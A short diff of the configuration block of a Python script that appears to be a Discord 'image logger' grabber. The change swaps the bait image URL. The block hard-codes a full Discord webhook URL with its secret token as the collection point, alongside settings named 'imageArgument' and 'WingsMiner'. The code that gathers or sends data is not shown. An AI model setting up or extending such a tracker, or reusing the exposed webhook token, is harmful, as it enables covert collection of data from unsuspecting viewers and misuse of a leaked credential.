@@ -23,7 +23,7 @@ __author__ = "lynxWings"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1130437510787498055/XzAm-j9ugZcsDVkM2ty0B4M957XNAaOraB0VpxlGecYVDSmIcB3Y6gn3vFqQMnPiUhKy", # <------------------------- Put your webhook link here.
-    "image": "https://i.scdn.co/image/ab67616d0000b273b8a8cd892742f645ccc04e19", # <------------------------- Put image address link here.
+    "image": "https://tse1.mm.bing.net/th?id=OIP.A6bkEWvRRy9x2KwL-D6-kgHaE8&pid=Api&P=0&h=180", # <------------------------- Put image address link here.
     "imageArgument": True,
 
     "username": "WingsMiner",
